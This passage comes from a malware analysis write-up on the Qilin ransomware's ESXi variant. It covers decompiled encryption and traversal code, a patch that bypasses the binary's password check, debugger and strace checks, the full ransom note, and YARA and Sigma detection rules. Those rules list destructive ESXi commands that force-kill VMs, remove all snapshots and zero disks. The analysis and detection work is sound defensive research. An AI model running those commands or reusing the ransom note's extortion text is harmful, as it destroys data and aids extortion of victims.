    DAT_00553520 = *param_1;
    DAT_00553528 = param_1[1];
    DAT_00553530 = param_1[2];
    DAT_00553538 = param_1[3];
...
    if (DAT_00553520 == (char *)0x0) {
      DAT_00553520 = "/";
    }
    iVar1 = mw_nftw(DAT_00553520,mw_nftw_callback,0x20,5);
    if (iVar1 == -1) {
      puVar2 = (undefined4 *)FUN_004d4823();
      mw_log(1,"Failed to nftw(): %d (%m)\n",*puVar2);
    }
    DAT_00553500 = 0;
  }
  else {
    iVar1 = -1;
  }
  return iVar1;
}
```

`DAT_00553530` points to `NULL` so directories are not modified. `DAT_00553528` points to `mw_thpool_add_work_w()`, a wrapper around [thpool_add_work()](https://github.com/Pithikos/C-Thread-Pool/blob/4eb5a69a439f252d2839af16b98d94464883dfa5/thpool.c#L195C5-L195C20). `thpool_add_work()` takes a function pointer as a callback which handles the encryption (`FUN_00401f50()`).

```
                             switchD_004010e5::caseD_101                     XREF[2]:     004010e5(j), 004ea530(*)  
        004012a7 c6 85 a0        MOV        byte ptr [RBP + 0xa0], 0x1
        004012ae be 25 9d        MOV        ESI, s_Dry_run_enabled_004e9d25                  = "Dry run enabled\n"
        004012b3 bf 04 00        MOV        EDI, 0x4
        004012b8 31 c0           XOR        ret, ret
        004012ba e8 61 20        CALL       mw_log                                           undefined mw_log(undefined param

```

```c
undefined8 mw_nftw_callback(void *param_1,long param_2,int param_3)

{
...
  lVar3 = DAT_00553538;
...
  if (param_3 == 1) {
    if (DAT_00553530 == (code *)0x0) {
      return 0;
    }
    if (*(char *)(lVar3 + 0xa0) == '\0') {
      (*DAT_00553530)(param_1,param_2,DAT_00553538);
      return 0;
    }
    mw_log(4,"Directory `%s` matches\n",param_1);
    return 0;
  }
...
  if (DAT_00553528 == (code *)0x0) {
    return 0;
  }
...
  if (*(char *)(lVar3 + 0xa0) == '\0') {
    (*DAT_00553528)(param_1,param_2,DAT_00553538);
  }
  else {
    mw_log(4,"File `%s` matches\n",param_1);
  }
...
```

```c
void mw_thpool_add_work_w(undefined8 param_1,long param_2,long param_3)

{
...
  mw_thpool_add_work(*(undefined8 *)(param_3 + 8),FUN_00401f50,plVar3);
...
```

```c
void FUN_00401f50(undefined8 *param_1)

{
...
  mw_log(4,"[%08x] Started job...\n",*param_1);
  param_1[0x11] = FUN_00402730;
  iVar5 = FUN_00404320(param_1 + 0xd,0x10);
  if (iVar5 == -1) {
    uVar7 = *param_1;
    pcVar16 = "[%08x] Failed to generate random nonce\n";
LAB_00402431:
    mw_log(1,pcVar16,uVar7);
    uVar2 = param_1[0x96];
  }
  else {
    uVar7 = FUN_004050a0(local_98,1);
    mw_log(4,"[%08x] Elapsed for nonce generation: %llu ms\n",*param_1,uVar7);
    iVar5 = FUN_00404320(param_1 + 9,0x20);
    if (iVar5 == -1) {
      uVar7 = param_1[2];
      pcVar16 = "[%08x] Failed to generate random key\n";
      goto LAB_00402431;
    }
    uVar7 = FUN_004050a0(local_98,1);
    mw_log(4,"[%08x] Elapsed for key generation: %llu ms\n",*param_1,uVar7);
    FUN_00402ed0(param_1[3] + 0x40,param_1[5],param_1 + 6,param_1 + 7);
    iVar5 = mw_open_log_and_futex_sync(param_1[2],0x82);
    *(int *)((long)param_1 + 0x24) = iVar5;
    if (iVar5 != -1) {
      FUN_004dfd7a(param_1[3] + 0x18);
      iVar5 = FUN_00403210(param_1 + 0x97,*(undefined8 *)(param_1[3] + 0x10),param_1 + 9,
                           param_1 + 0xd,param_1[6],param_1[7]);
      FUN_004e07d7(param_1[3] + 0x18);
      if (iVar5 < 0) {
        mw_log(1,"[%08x] Encrypting file \'%s\': FAILURE (metadata)\n",*param_1,param_1[2]);
...
```

The cryptography operations use the OpenSSL library, indicated by strings like `OPENSSL_init` and `OPENSSL_finish`. Additionally, [crypto/bio/bio_lib.c](https://github.com/openssl/openssl/blob/5304d563359648ae2910cad4f9badc5dd1fc0210/crypto/bio/bio_lib.c), [crypto/asn1/a_dup.c](https://github.com/openssl/openssl/blob/5304d563359648ae2910cad4f9badc5dd1fc0210/crypto/asn1/a_dup.c) and other OpenSSL files are referenced in the code. Also, the signature of the error logging function `mw_ssl_put_error()` matches [ERR_put_error()](https://github.com/openssl/openssl/blob/5304d563359648ae2910cad4f9badc5dd1fc0210/include/openssl/err.h.in#L398).

```c
undefined8 FUN_004492ce(undefined8 param_1,long param_2)

{
...
      mw_ssl_put_error(0xd,0xbf,0x41,"crypto/asn1/a_dup.c",0x3d);
...
      FUN_00413456(local_20,"crypto/asn1/a_dup.c",0x42);
...
```

```c
int FUN_0040634c(long *param_1)

{
...
        FUN_00413456(param_1,"crypto/bio/bio_lib.c",0x8a);
...
```

After file traversal and encryption the program deletes itself.

```c
void mw_main(undefined4 param_1,undefined8 *param_2)

{
...
      mw_log(4,"File tree traversing done. Waiting workers to complete...\n");
      FUN_00405e10(*(undefined8 *)(piVar5 + 2));
      mw_log(4,"Done. Cleaning up...\n");
...
      uVar6 = mw_rel_to_abs_path(*param_2,0);
      mw_unlink(uVar6);
...
      mw_log(3,"All done!\n");
LAB_004016e9:
                    /* WARNING: Subroutine does not return */
      mw_exit(0);
    }
...
```
```
                             **************************************************************
                             *                          FUNCTION                          *
                             **************************************************************
                             undefined mw_unlink()
             undefined         AL:1           <RETURN>
                             mw_unlink                                       XREF[2]:     mw_main:004016cb(c), 0054a740(*)  
        004d4346 b8 57 00        MOV        EAX, 0x57
        004d434b 0f 05           SYSCALL

```

There is also a function that accesses `/etc/resolv.conf` but it is never called according to cross-references. I verified this with other static analysis tools like Binary Ninja confirming it is likely dead code. There may be other similar unused functions in the binary.

### Dynamic analysis

During static analysis we already uncovered the capabilities of the malware so now we will focus on filling in the blanks:

- check what is being written to `/etc/motd` exactly
- check if `/etc/resolv.conf` is being accessed

As we saw earlier without the proper password we cannot run the binary. Fortunately patching the password check is simple as we only need to patch a jump instruction:

```c
      ret = FUN_004d93d0(*(undefined8 *)(piVar5 + 0x1a),uVar6,0x20);
      if (ret != 0) {
        mw_log(0,"Password is not correct!\n");
        mw_free(uVar6);
        FUN_00401ba0(piVar5);
                    /* WARNING: Subroutine does not return */
        mw_exit(1);
      }
      mw_free(uVar6);
      lVar8 = mw_strlen
```

```
        00401391 48 8b 7d 68     MOV        RDI, qword ptr [RBP + 0x68]
        00401395 ba 20 00        MOV        EDX, 0x20
        0040139a 4c 89 e6        MOV        RSI, R12
        0040139d e8 2e 80        CALL       FUN_004d93d0                                     undefined FUN_004d93d0()
        004013a2 85 c0           TEST       ret, ret
        004013a4 74 40           JZ         LAB_004013e6
        004013a6 be 33 9e        MOV        ESI, s_Password_is_not_correct!_004e9e33         = "Password is not correct!\n"
        004013ab 31 c0           XOR        ret, ret
        004013ad 31 ff           XOR        EDI, EDI
        004013af e8 6c 1f        CALL       mw_log                                           undefined mw_log(undefined param
        004013b4 4c 89 e7        MOV        RDI, R12
        004013b7 e8 9d 90        CALL       mw_free                                          undefined mw_free()
        004013bc 48 89 ef        MOV        RDI, RBP
        004013bf e8 dc 07        CALL       FUN_00401ba0                                     undefined FUN_00401ba0()
        004013c4 bf 01 00        MOV        EDI, 0x1
        004013c9 e8 1b a4        CALL       mw_exit                                          undefined mw_exit()
                             -- Flow Override: CALL_RETURN (CALL_TERMINATOR)
...
                             LAB_004013e6                                    XREF[1]:     004013a4(j)  
        004013e6 4c 89 e7        MOV        RDI, R12
        004013e9 e8 6b 90        CALL       mw_free                                          undefined mw_free()
        004013ee 48 8b bd        MOV        RDI, qword ptr [RBP + 0xb0]
        004013f5 e8 66 7d        CALL       mw_strlen                                        undefined mw_strlen(void * str)
```

We need to replace:

```
        004013a4 74 40           JZ         LAB_004013e6
```

with:

```
        004013a4 75 40           JNZ        LAB_004013e6
```

Then we can execute the malware with any chosen password.

If we check where `/etc/resolv.conf` is used in the code we can see it is passed as an argument to a `stat()` syscall for example:

```
        004e52ea 48 8d b4        LEA        RSI=>local_128, [RSP + 0x90]
        004e52f2 48 8d 3d        LEA        RDI, [s_/etc/resolv.conf_00527150]               = "/etc/resolv.conf"
        004e52f9 e8 d3 ef        CALL       FUN_004d42d1                                     undefined FUN_004d42d1()

```
```
                             **************************************************************
                             *                          FUNCTION                          *
                             **************************************************************
                             undefined FUN_004d42d1()
             undefined         AL:1           <RETURN>
                             FUN_004d42d1                                    XREF[4]:     mw_do_nftw:004052d0(c), 
                                                                                          FUN_00491576:004917bc(c), 
                                                                                          FUN_004e52d3:004e52f9(c), 
                                                                                          0054a6f0(*)  
        004d42d1 41 54           PUSH       R12
        004d42d3 49 89 f0        MOV        R8, RSI
        004d42d6 b8 04 00        MOV        EAX, 0x4
        004d42db 48 81 ec        SUB        RSP, 0x90
        004d42e2 48 89 e6        MOV        RSI, RSP
        004d42e5 0f 05           SYSCALL

```
So if we log the syscalls we can look for `/etc/resolv.conf` and `stat()` calls in the log:

```
$ strace -e trace=all -f ./qilin-esxi-patched.elf -y --path test/ --password 123 > strace.log 2>&1
$ grep resolv strace.log
$ grep stat\( strace.log 
[pid  4019] fstat(3,  <unfinished ...>
[pid  4015] fstat(4,  <unfinished ...>
[pid  4015] fstat(4, {st_mode=S_IFDIR|0775, st_size=4096, ...}) = 0
[pid  4015] fstat(5,  <unfinished ...>
[pid  4019] fstat(3, {st_mode=S_IFDIR|0555, st_size=0, ...}) = 0
[pid  4019] fstat(3, {st_mode=S_IFDIR|0555, st_size=0, ...}) = 0
```
They are not present so it looks like the `/etc/resolv.conf` related functions are indeed dead code.

We can check it with `gdb` as well to be sure. First we need to identify the function where `/etc/resolv.conf` is accessed, determine if the executable is PIE or non-PIE and find the entry point of the executable:

```c
void FUN_004e52d3(void)

{
...
  
  if (DAT_0055f4a8 == (code *)0x0) {
    iVar3 = FUN_004d42d1("/etc/resolv.conf",local_128);
    if (iVar3 != 0) {
      local_d0 = 0;
    }
    if ((int)local_d0 != DAT_0055e588) {
      DAT_0055e588 = (int)local_d0;
      FUN_004e5664();
    }
  }
  if (DAT_0055f4a0 == 0) {
    DAT_00553461 = 5;
    DAT_00553460 = 3;
    lVar4 = FUN_004d5d6d("/etc/resolv.conf","r");
...
```

```
$ readelf -h qilin-esxi-patched.elf 
ELF Header:
  Magic:   7f 45 4c 46 02 01 01 00 00 00 00 00 00 00 00 00 
  Class:                             ELF64
  Data:                              2's complement, little endian
  Version:                           1 (current)
  OS/ABI:                            UNIX - System V
  ABI Version:                       0
  Type:                              EXEC (Executable file)
  Machine:                           Advanced Micro Devices X86-64
  Version:                           0x1
  Entry point address:               0x4019aa
  Start of program headers:          64 (bytes into file)
  Start of section headers:          1385776 (bytes into file)
  Flags:                             0x0
  Size of this header:               64 (bytes)
  Size of program headers:           56 (bytes)
  Number of program headers:         9
  Size of section headers:           64 (bytes)
  Number of section headers:         19
  Section header string table index: 18
```
Based on this output our binary is non-PIE (`Type: EXEC (Executable file)`) which means ASLR does not complicate things.

Now we can:

- set a breakpoint on the entry point (optional)
- set the command line arguments
- set `follow-fork-mode child` which is necessary because the process goes into background via `fork()`
- run the executable to see whether `FUN_004e52d3()` is ever called

```
$ gdb ./qilin-esxi-patched.elf 
GNU gdb (Ubuntu 15.0.50.20240403-0ubuntu1) 15.0.50.20240403-git
...
Reading symbols from ./qilin-esxi-patched.elf...
(No debugging symbols found in ./qilin-esxi-patched.elf)
(gdb) b *0x4019aa
Breakpoint 1 at 0x4019aa
(gdb) set args -y --path test/ --password 123
(gdb) set follow-fork-mode child
(gdb) run
Starting program: /home/remnux/Downloads/qilin-esxi-patched.elf -y --path test/ --password 123
...
Breakpoint 1, 0x00000000004019aa in ?? ()
(gdb) b *0x4e52d3
Breakpoint 2 at 0x4e52d3
(gdb) c
Continuing.
--- Configuration start ---
...
--- Configuration end ---
[Attaching after process 3832 fork to child process 3836]
[New inferior 2 (process 3836)]
[Detaching after fork from parent process 3832]
[Inferior 1 (process 3832) detached]
Process gone into background
[New LWP 3837]
[New LWP 3838]
[New LWP 3839]
[New LWP 3840]
[LWP 3840 exited]
[LWP 3839 exited]
[LWP 3837 exited]
[LWP 3838 exited]
[Inferior 2 (process 3836) exited normally]
BFD: reopening /home/remnux/Downloads/qilin-esxi-patched.elf: No such file or directory
(gdb)
```
Breakpoint 2 is never hit which confirms that `FUN_004e52d3()` is never called.

Finally, we can check what is written to `/etc/motd` which turns out to be the ransomware notes as expected.

```
$ cat /etc/motd
-- Qilin 

Your network/system was encrypted. 
Encrypted files have new extension. 

-- Compromising and sensitive data 

We have downloaded compromising and sensitive data from you system/network 
If you refuse to communicate with us and we do not come to an agreement, your data will be published. 
Data includes: 
- Employees personal data, CVs, DL , SSN. 
- Complete network map including credentials for local and remote services. 
- Financial information including clients data, bills, budgets, annual reports, bank statements. 
- Complete datagrams/schemas/drawings for manufacturing in solidworks format 
- And more... 

-- Warning 

1) If you modify files - our decrypt software won't able to recover data 
2) If you use third party software - you can damage/modify files (see item 1) 
3) You need cipher key / our decrypt software to restore you files. 
4) The police or authorities will not be able to help you get the cipher key. We encourage you to consider your decisions. 

-- Recovery 

1) Download tor browser: https://www.torproject.org/download/ 
2) Go to domain 
3) Enter credentials-- Credentials 

Extension: o7L03e8F9J 
Domain: [redacted].onion 
login: [redacted] 
password: [redacted]
```

## YARA

Note: the rule is available [here](https://github.com/gemesa/threat-detection-rules) as well.

The binary is neither packed nor obfuscated and contains many unique strings, so YARA rules can be easily implemented.

```
import "elf"

rule qilin {
  meta:
    description = "Qilin"
    author = "Andras Gemes"
    date = "2025-03-12"
    sha256 = "555964b2fed3cced4c75a383dd4b3cf02776dae224f4848dcc03510b1de4dbf4"
    ref1 = "https://shadowshell.io/qilin-ransomware"
    ref2 = "https://bazaar.abuse.ch/sample/555964b2fed3cced4c75a383dd4b3cf02776dae224f4848dcc03510b1de4dbf4"

  strings:
    $1 = "Disables process kill"
    $2 = "Disables rename of completed files"
    $3 = "Disables snapshot deletion"
    $4 = "Disables VM kill"
    $5 = "for I in $(esxcli storage filesystem list |grep 'VMFS-5' |awk '{print $1}'); do vmkfstools -c 10M -d eagerzeroedthick $I/eztDisk > /dev/null; vmkfstools -U $I/eztDisk > /dev/null; done"
    $6 = "for I in $(esxcli storage filesystem list |grep 'VMFS-5' |awk '{print $1}'); do vmkfstools -c 10M -d eagerzeroedthick $I/eztDisk; vmkfstools -U $I/eztDisk; done"
    $7 = "for I in $(esxcli storage filesystem list |grep 'VMFS-6' |awk '{print $1}'); do vmkfstools -c 10M -d eagerzeroedthick $I/eztDisk > /dev/null; vmkfstools -U $I/eztDisk > /dev/null; done"
    $8 = "for I in $(esxcli storage filesystem list |grep 'VMFS-6' |awk '{print $1}'); do vmkfstools -c 10M -d eagerzeroedthick $I/eztDisk; vmkfstools -U $I/eztDisk; done"
    $9 = "esxcfg-advcfg -s 32768 /BufferCache/MaxCapacity"
    $10 = "esxcfg-advcfg -s 20000 /BufferCache/FlushInterval"
    $11 = "esxcli vm process list"
    $12 = "esxcli vm process kill -t force -w %llu"
    $13 = "vim-cmd vmsvc/getallvms"
    $14 = "vim-cmd vmsvc/snapshot.removeall %llu > /dev/null 2>&1"
    $15 = "dhl:p:Rrt:wy"
    $16 = "%s_RECOVER.txt"
    $17 = "/etc/motd.template"
    $18 = "/var/run/motd"
    $19 = "/etc/motd"
    $20 = "-----BEGIN PUBLIC KEY-----"
    $21 = "-----BEGIN PUBLIC KEY-----\nMIICIjANBgkqhkiG9w0BAQEFAAOCAg8AMIICCgKCAgEA3a4G68kgJX2bwWZX23Yz\nzPI68Fl6eocJ+XLcPN9dvG3o/SV04F2zE7nWUhBbwsBHiX8bIquqVyVV+Y93FOCn\neJODySiy+bLZ1QfXKMjoNbhHq+aeuYCV8na3LF3hoGpST6uJpXUxbhZOBqHHbbx6\nvVy1fXOUEvaEOhqkglfDUQ7/fH6sT1p/3RyCtGi3o7588oMHOVgz3jZux2dqp9Zy\nPs9MqZs0OtcBAXTG4EmD8yz2RgH+D9j756snWNZeknnjNO+KUARDSICKFOYtb3wz\nxYFVvACB3sJuTpAJ2HuaWIEo8NljGsMkNTqy3tFY0WnUBxAgt7AMUM+Ex75DGa9H\nIAXd+bTOfo+zyUGKiUFBqBZjo8T0ueTpr8BZb98fl5/LFpXmBuR/dJBfeuq3a4vK\nFpxx796zUe/hoiBSvw9GzLyYa5A5Lbcz2qOi9RTYTEmZDX9qss+GfI54ZM2vrxyC\nnUJz/dDxxjFOujMJJBN9b1G9KIgiD3Sh41RLfEEemOG4Fo+1TbegKcK11a3LvUfL\ng3PhwflhaZwuwz3Nrie9vS9NKM+935rCkjeP1tap8NvrKow4F0KPg0loES06/fjm\n47PI12ZrUc6YE5zH3CwtiCXW4BUlpPacZgUJRpvZAODHYlejTnxtiWvq4XLe1A+3\n98/IXu0IMoFWAH2KnlPsczsCAwEAAQ==\n-----END PUBLIC KEY-----\n"
    $22 = "Detected OS: ESXi (%d)"
    $23 = "Are you sure to start encryption? (y/n)"
    $24 = "File tree traversing done. Waiting workers to complete..."
    $25 = "Qilin"
    $26 = "Your network/system was encrypted."
    $27 = "o7L03e8F9J"

  condition:
    defined(elf.type) and 15 of them
}
```

## Sigma

Note: the rules are available [here](https://github.com/gemesa/threat-detection-rules) as well.

```
title: Qilin ESXi ransomware - VM kill commands
id: a11306e8-d1aa-43f2-bb4a-f9998e15d2bf
status: experimental
description: |
  Detects Qilin ransomware behavior on ESXi hosts - forceful VM termination.
  Based on YARA rule detecting: "esxcli vm process kill -t force -w %llu"
author: Andras Gemes
date: 2025/03/12
references:
  - https://shadowshell.io/qilin-ransomware
  - https://github.com/gemesa/threat-detection-rules/tree/main/qilin
# https://github.com/SigmaHQ/sigma-specification/blob/main/specification/sigma-appendix-taxonomy.md
# https://github.com/SigmaHQ/sigma-specification/blob/main/specification/sigma-appendix-modifiers.md
logsource:
  product: esxi
  category: process_creation
detection:
  selection_esxcli_kill:
    CommandLine|contains|all:
      - "esxcli"
      - "vm"
      - "process"
      - "kill"
  selection_force:
    CommandLine|contains: "force"
  condition: selection_esxcli_kill and selection_force
falsepositives:
  - Legitimate administrator VM management (rare to use force kill)
level: high
tags:
  # tactic - https://attack.mitre.org/tactics/enterprise/
  - attack.impact
  # Service Stop - https://attack.mitre.org/techniques/T1489/
  - attack.t1489
  # Data Encrypted for Impact - https://attack.mitre.org/techniques/T1486/
  - attack.t1486

---
title: Qilin ESXi ransomware - snapshot deletion
id: 20fe815f-8420-4bb8-97b9-c5b1942c08eb
status: experimental
description: |
  Detects Qilin ransomware deleting VM snapshots before encryption.
  Based on YARA rule detecting: "vim-cmd vmsvc/snapshot.removeall %llu"
author: Andras Gemes
date: 2025/03/12
references:
  - https://shadowshell.io/qilin-ransomware
  - https://github.com/gemesa/threat-detection-rules/tree/main/qilin
# https://github.com/SigmaHQ/sigma-specification/blob/main/specification/sigma-appendix-taxonomy.md
# https://github.com/SigmaHQ/sigma-specification/blob/main/specification/sigma-appendix-modifiers.md
logsource:
  product: esxi
  category: process_creation
detection:
  selection:
    CommandLine|contains|all:
      - "vim-cmd"
      - "vmsvc"
      - "snapshot.removeall"
  condition: selection
falsepositives:
  - Legitimate snapshot cleanup by administrators
level: high
tags:
  # tactic - https://attack.mitre.org/tactics/enterprise/
  - attack.impact
  # Inhibit System Recovery - https://attack.mitre.org/techniques/T1490/
  - attack.t1490

---
title: Qilin ESXi ransomware - buffer cache manipulation
id: 3a2918ee-910c-4e40-8192-5ca9eb35ab98
status: experimental
description: |
  Detects Qilin ransomware manipulating ESXi buffer cache settings to speed up encryption.
  Based on YARA rules detecting esxcfg-advcfg commands.
author: Andras Gemes
date: 2025/03/12
references:
  - https://shadowshell.io/qilin-ransomware
  - https://github.com/gemesa/threat-detection-rules/tree/main/qilin
# https://github.com/SigmaHQ/sigma-specification/blob/main/specification/sigma-appendix-taxonomy.md
# https://github.com/SigmaHQ/sigma-specification/blob/main/specification/sigma-appendix-modifiers.md
logsource:
  product: esxi
  category: process_creation
detection:
  selection_buffercache:
    CommandLine|contains|all:
      - "esxcfg-advcfg"
      - "BufferCache"
  selection_params:
    CommandLine|contains:
      - "MaxCapacity"
      - "FlushInterval"
  condition: selection_buffercache and selection_params
falsepositives:
  - Legitimate ESXi performance tuning (rare)
level: high
tags:
  # tactic - https://attack.mitre.org/tactics/enterprise/
  - attack.defense-evasion
  # Impair Defenses - https://attack.mitre.org/techniques/T1562/
  - attack.t1562

---
title: Qilin ESXi ransomware - eager zero disk wiping
id: e180d137-5816-46e7-bdd7-44e3261444e4
status: experimental
description: |
  Detects Qilin ransomware using vmkfstools with eagerzeroedthick to wipe free space.
  This prevents data recovery after encryption.
author: Andras Gemes
date: 2025/03/12
references:
  - https://shadowshell.io/qilin-ransomware
  - https://github.com/gemesa/threat-detection-rules/tree/main/qilin
# https://github.com/SigmaHQ/sigma-specification/blob/main/specification/sigma-appendix-taxonomy.md
# https://github.com/SigmaHQ/sigma-specification/blob/main/specification/sigma-appendix-modifiers.md
logsource:
  product: esxi
  category: process_creation
detection:
  selection:
    CommandLine|contains|all:
      - "vmkfstools"
      - "eagerzeroedthick"
  condition: selection
falsepositives:
  - VMware admin creating eager zeroed thick disks
  - VMware KB 318028 workaround for VMFS heap memory exhaustion
level: high
tags:
  # tactic - https://attack.mitre.org/tactics/enterprise/
  - attack.impact
  # Data Destruction - https://attack.mitre.org/techniques/T1485/
  - attack.t1485

---
title: Qilin ESXi ransomware - ransom note creation
id: c42cfe5f-fb9f-4b46-b0fa-93f44c9bbbc6
status: experimental
description: |
  Detects creation of Qilin ransom note files.
  Based on YARA rule detecting: "%s_RECOVER.txt"
author: Andras Gemes
date: 2025/03/12
references:
  - https://shadowshell.io/qilin-ransomware
  - https://github.com/gemesa/threat-detection-rules/tree/main/qilin
# https://github.com/SigmaHQ/sigma-specification/blob/main/specification/sigma-appendix-taxonomy.md
# https://github.com/SigmaHQ/sigma-specification/blob/main/specification/sigma-appendix-modifiers.md
logsource:
  product: esxi
  category: file_event
detection:
  selection:
    TargetFilename|endswith: "_RECOVER.txt"
  condition: selection
falsepositives:
  - Unlikely
level: critical
tags:
  # tactic - https://attack.mitre.org/tactics/enterprise/
  - attack.impact
  # Data Encrypted for Impact - https://attack.mitre.org/techniques/T1486/
  - attack.t1486

---
title: Qilin ESXi ransomware - MOTD modification
id: 9d62bba1-a42d-4b97-850d-9c7ccf986691
status: experimental
description: |
  Detects modification of /etc/motd files, used by Qilin to display ransom message on login.
author: Andras Gemes
date: 2025/03/12
references:
  - https://shadowshell.io/qilin-ransomware
  - https://github.com/gemesa/threat-detection-rules/tree/main/qilin
# https://github.com/SigmaHQ/sigma-specification/blob/main/specification/sigma-appendix-taxonomy.md
# https://github.com/SigmaHQ/sigma-specification/blob/main/specification/sigma-appendix-modifiers.md
logsource:
  product: esxi
  category: file_event
detection:
  selection:
    TargetFilename:
      - "/etc/motd"
      - "/etc/motd.template"
      - "/var/run/motd"
  condition: selection
falsepositives:
  - System updates, legitimate MOTD changes
level: medium
tags:
  # tactic - https://attack.mitre.org/tactics/enterprise/
  - attack.impact
  # Defacement - https://attack.mitre.org/techniques/T1491/
  - attack.t1491
```
